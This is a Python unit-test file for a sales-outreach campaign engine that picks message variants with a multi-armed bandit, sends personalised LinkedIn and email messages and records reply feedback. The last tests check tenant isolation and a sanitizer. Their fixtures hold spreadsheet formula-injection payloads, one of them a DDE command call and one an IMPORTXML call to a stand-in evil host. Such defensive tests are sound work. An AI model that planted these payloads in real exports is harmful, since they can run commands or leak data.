import os
import unittest
from unittest.mock import MagicMock, patch

from campaigns.backend.services.bandit_service import (
    _IN_MEMORY_EXPERIMENTS,
    _IN_MEMORY_VARIANTS,
    _LEAD_ARM_LOCKS,
    add_custom_variant,
    mutate_self_healing_variant,
    record_variant_feedback,
    resolve_bandit_arm_for_execution,
)
from campaigns.backend.services.elein_executor import EleInNodeExecutor
from inbox.backend.services.inbox_service import sync_inbox_messages


class TestHorizon31BanditOrchestratorExecution(unittest.TestCase):
    """
    Horizon 31: Thompson Sampling Multi-Armed Bandit Dynamic Copy Execution in Sequence Orchestrator.
    Verifies Layer 0 (Foundational), Layer 1 (Environmental Resilience), and Layer 2 (Human Paranoia).
    """

    def setUp(self):
        _IN_MEMORY_EXPERIMENTS.clear()
        _IN_MEMORY_VARIANTS.clear()
        _LEAD_ARM_LOCKS.clear()
        os.environ["TEST_MODE"] = "true"

    # -------------------------------------------------------------------------
    # LAYER 0: FOUNDATIONAL LAYER
    # -------------------------------------------------------------------------
    def test_layer0_send_message_samples_bandit_arm_and_interpolates_variables(self):
        mock_worker = MagicMock()
        mock_worker.send_message.return_value = {"status": "success"}
        executor = EleInNodeExecutor(worker=mock_worker, supabase=MagicMock(), workspace_id="ws-h31")

        node_data = {
            "_lead_id": "lead-101",
            "_campaign_id": "camp-h31",
            "_current_node_id": "node-msg-1",
            "first_name": "Aria",
            "company": "Hyperion AI",
            "use_bandit": True,
            "bandit_variants": [
                {
                    "id": "arm-roi",
                    "name": "ROI Hook",
                    "template_text": "Hey {{first_name}}, saw {{company}} scaling outbound—want our ROI benchmark?",
                    "alpha_param": 50.0,
                    "beta_param": 2.0,
                },
                {
                    "id": "arm-weak",
                    "name": "Weak Hook",
                    "template_text": "Hi {{first_name}}, checking in.",
                    "alpha_param": 1.0,
                    "beta_param": 50.0,
                },
            ],
        }
        res = executor.handle_send_message(node_data, "https://linkedin.com/in/aria")
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["bandit_variant_id"], "arm-roi")
        self.assertEqual(res["bandit_arm_name"], "ROI Hook")
        self.assertIn("Aria", res["body_sent"])
        self.assertIn("Hyperion AI", res["body_sent"])
        self.assertEqual(res["variables"]["_last_bandit_variant_id"], "arm-roi")

    def test_layer0_send_email_samples_bandit_arm_subject_and_body(self):
        executor = EleInNodeExecutor(worker=MagicMock(), supabase=None, workspace_id="ws-h31-email")
        node_data = {
            "_lead_id": "lead-email-1",
            "_campaign_id": "camp-email-1",
            "_current_node_id": "node-email-1",
            "email": "aria@hyperion.ai",
            "first_name": "Aria",
            "company": "Hyperion AI",
            "use_bandit": True,
            "bandit_variants": [
                {
                    "id": "email-arm-win",
                    "name": "Executive Teardown",
                    "subject": "Teardown for {{company}}",
                    "template_text": "Hi {{first_name}}, built a custom teardown for {{company}}.",
                    "alpha_param": 60.0,
                    "beta_param": 1.0,
                }
            ],
        }
        res = executor.handle_send_email(node_data, "https://linkedin.com/in/aria")
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["bandit_variant_id"], "email-arm-win")
        self.assertEqual(res["subject"], "Teardown for Hyperion AI")
        self.assertEqual(res["body"], "Hi Aria, built a custom teardown for Hyperion AI.")

    def test_layer0_connection_request_samples_bandit_note_and_clamps_300_chars(self):
        mock_worker = MagicMock()
        mock_worker.send_connection_request.return_value = {"status": "success"}
        executor = EleInNodeExecutor(worker=mock_worker, supabase=None, workspace_id="ws-h31-conn")

        long_suffix = "x" * 320
        node_data = {
            "_lead_id": "lead-conn-1",
            "first_name": "Devon",
            "note_strategy": "Bandit",
            "bandit_variants": [
                {
                    "id": "conn-arm-1",
                    "name": "Peer Connect",
                    "template_text": f"Hi {{{{first_name}}}}, {long_suffix}",
                    "alpha_param": 25.0,
                    "beta_param": 1.0,
                }
            ],
        }
        res = executor.handle_connection_request(node_data, "https://linkedin.com/in/devon")
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["bandit_variant_id"], "conn-arm-1")
        self.assertLessEqual(len(res["note"]), 300)
        self.assertTrue(res["note"].startswith("Hi Devon,"))

    def test_layer0_ab_split_bandit_mode_routes_dynamically(self):
        executor = EleInNodeExecutor(worker=MagicMock(), supabase=None, workspace_id="ws-h31-ab")
        node_data = {
            "_lead_id": "lead-ab-1",
            "_current_node_id": "node-ab-1",
            "mode": "bandit",
            "path_a_alpha": 1.0,
            "path_a_beta": 60.0,
            "path_b_alpha": 60.0,
            "path_b_beta": 1.0,
        }
        res = executor.handle_ab_split(node_data, "https://linkedin.com/in/lead-ab-1")
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["mode"], "bandit")
        self.assertEqual(res["branch"], "Path B")
        self.assertEqual(res["bandit_variant_id"], "ab-node-ab-1-path-b")

    def test_layer0_closed_loop_inbound_reply_records_bandit_feedback(self):
        # Seed experiment in workspace ws-h31-inbox
        resolve_bandit_arm_for_execution(workspace_id="ws-h31-inbox")
        mock_sb = MagicMock()
        mock_sb.table.return_value.select.return_value.eq.return_value.in_.return_value.execute.return_value.data = []

        messages = [
            {
                "id": "msg-inbound-bandit-1",
                "sender_name": "Elena Rostova",
                "message_text": "Can we schedule a 15-minute call this Thursday at 2pm? Here is my calendly link.",
                "direction": "inbound",
                "bandit_variant_id": "var-challenger-1",
            }
        ]
        sync_inbox_messages(mock_sb, "ws-h31-inbox", "acc-1", messages)
        self.assertIn("bandit_feedback", messages[0])
        self.assertEqual(messages[0]["bandit_feedback"]["outcome"], "meeting_booked")
        self.assertGreater(messages[0]["bandit_feedback"]["alpha_param"], 6.0)

    # -------------------------------------------------------------------------
    # LAYER 1: ENVIRONMENTAL FAILURE ANALYSIS
    # -------------------------------------------------------------------------
    def test_layer1_sticky_lead_to_arm_idempotency_prevents_retry_flip_and_double_impression(self):
        first = resolve_bandit_arm_for_execution(
            workspace_id="ws-sticky",
            campaign_id="camp-1",
            node_id="node-1",
            lead_id="lead-sticky-99",
            sticky=True,
        )
        exp_id = first["experiment_id"]
        chosen_id = first["selected_variant_id"]
        impressions_after_first = next(
            v["impressions"] for v in _IN_MEMORY_VARIANTS[exp_id] if v["id"] == chosen_id
        )

        # Simulate 5 worker retries for the exact same lead + node
        for _ in range(5):
            retry = resolve_bandit_arm_for_execution(
                workspace_id="ws-sticky",
                campaign_id="camp-1",
                node_id="node-1",
                lead_id="lead-sticky-99",
                sticky=True,
            )
            self.assertTrue(retry["sticky_hit"])
            self.assertEqual(retry["selected_variant_id"], chosen_id)

        impressions_after_retries = next(
            v["impressions"] for v in _IN_MEMORY_VARIANTS[exp_id] if v["id"] == chosen_id
        )
        self.assertEqual(impressions_after_first, impressions_after_retries)

    def test_layer1_autonomous_self_healing_spawns_challenger_on_degradation(self):
        # var-direct-3 has 24 impressions, 2 positive replies, 4 objections -> degrades on objection
        fb = record_variant_feedback(
            variant_id="var-direct-3",
            outcome="objection",
            workspace_id="ws-auto-heal",
            auto_heal=True,
        )
        self.assertEqual(fb["status"], "success")
        self.assertEqual(fb["arm_status"], "degraded")
        self.assertTrue(fb.get("auto_healed"))
        challenger = fb.get("auto_mutated_challenger")
        self.assertIsNotNone(challenger)
        self.assertEqual(challenger["parent_variant_id"], "var-direct-3")
        self.assertEqual(challenger["generation"], 2)

    def test_layer1_auto_healing_idempotent_does_not_spawn_duplicate_challengers(self):
        fb1 = record_variant_feedback(
            variant_id="var-direct-3",
            outcome="objection",
            workspace_id="ws-no-dup-heal",
            auto_heal=True,
        )
        first_challenger_id = fb1["auto_mutated_challenger"]["id"]

        fb2 = record_variant_feedback(
            variant_id="var-direct-3",
            outcome="objection",
            workspace_id="ws-no-dup-heal",
            auto_heal=True,
        )
        self.assertEqual(fb2["auto_mutated_challenger"]["id"], first_challenger_id)

    def test_layer1_bandit_exception_gracefully_falls_back_to_default_body(self):
        mock_worker = MagicMock()
        mock_worker.send_message.return_value = {"status": "success"}
        executor = EleInNodeExecutor(worker=mock_worker, supabase=None, workspace_id="ws-fallback")

        with patch(
            "campaigns.backend.services.bandit_service.resolve_bandit_arm_for_execution",
            side_effect=RuntimeError("Simulated bandit engine outage"),
        ):
            res = executor.handle_send_message(
                {
                    "_lead_id": "lead-fb-1",
                    "first_name": "Marcus",
                    "use_bandit": True,
                    "body": "Fallback message for {{first_name}}.",
                },
                "https://linkedin.com/in/marcus",
            )
            self.assertEqual(res["status"], "success")
            self.assertEqual(res["body_sent"], "Fallback message for Marcus.")

    # -------------------------------------------------------------------------
    # LAYER 2: HUMAN PARANOIA (THE HUMAN ERROR ELEMENT)
    # -------------------------------------------------------------------------
    def test_layer2_cross_tenant_idor_blocked_on_record_feedback(self):
        created = add_custom_variant(
            workspace_id="ws-tenant-alpha",
            campaign_id="camp-alpha",
            name="Alpha Secret Copy",
            template_text="Hi {{first_name}}, confidential alpha offer.",
        )
        alpha_var_id = created["variant"]["id"]

        with self.assertRaises(PermissionError):
            record_variant_feedback(
                variant_id=alpha_var_id,
                outcome="unsubscribe",
                workspace_id="ws-tenant-beta",
            )

    def test_layer2_cross_tenant_idor_blocked_on_mutate_self_healing(self):
        created = add_custom_variant(
            workspace_id="ws-tenant-alpha",
            campaign_id="camp-alpha",
            name="Alpha Proprietary Angle",
            template_text="Hi {{first_name}}, alpha angle.",
        )
        alpha_var_id = created["variant"]["id"]

        with self.assertRaises(PermissionError):
            mutate_self_healing_variant(
                parent_variant_id=alpha_var_id,
                workspace_id="ws-tenant-beta",
            )

    def test_layer2_inline_bandit_variants_formula_injection_sanitized(self):
        arm = resolve_bandit_arm_for_execution(
            workspace_id="ws-formula-guard",
            campaign_id="camp-sec",
            node_id="node-sec",
            lead_id="lead-sec-1",
            inline_variants=[
                {
                    "id": "arm-malicious",
                    "name": "=CMD|' /C calc'!A0 Exploit Arm",
                    "subject": "+@SUM(1+1) Subject",
                    "template_text": "-=IMPORTXML('http://evil.tld') Hi {{first_name}}",
                    "alpha_param": 10.0,
                    "beta_param": 1.0,
                }
            ],
        )
        self.assertFalse(arm["arm_name"].startswith("="))
        self.assertFalse(arm["subject"].startswith(("+","@")))
        self.assertFalse(arm["template_text"].startswith(("-", "=")))


if __name__ == "__main__":
    unittest.main()
